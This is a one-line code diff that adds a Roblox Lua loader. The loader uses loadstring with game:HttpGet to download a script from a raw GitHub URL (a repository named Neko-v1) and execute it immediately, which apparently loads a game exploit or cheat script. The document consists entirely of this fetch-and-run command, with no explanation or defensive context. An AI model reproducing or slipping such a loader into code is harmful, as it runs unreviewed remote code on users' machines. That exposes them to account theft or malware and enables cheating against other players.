@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Gazer-Ha/Neko-v1/main/Extremely%20Broken"))()
